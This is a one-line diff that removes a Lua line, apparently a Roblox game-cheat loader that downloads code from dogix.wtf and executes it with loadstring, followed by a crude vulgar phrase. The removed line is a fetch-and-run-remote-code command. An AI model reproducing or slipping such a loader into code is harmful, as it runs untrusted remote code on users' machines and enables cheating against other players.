@@ -1,1 +1,0 @@
-loadstring(game:HttpGetAsync'https://dogix.wtf/scripts/lt2/barkdata/bootstrapper')'pingity pongity blood can suck my dongity'
